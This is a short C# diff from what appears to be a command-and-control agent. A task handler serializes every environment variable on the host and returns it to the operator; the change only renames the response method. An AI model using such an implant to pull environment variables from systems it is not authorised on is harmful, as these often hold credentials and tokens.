@@ -18,7 +18,7 @@ namespace Agent
         {
             string output = JsonSerializer.Serialize(Environment.GetEnvironmentVariables());
 
-            await messageManager.AddResponse(new ResponseResult()
+            messageManager.AddTaskResponse(new ResponseResult()
             {
                 task_id = job.task.id,
                 user_output = output,
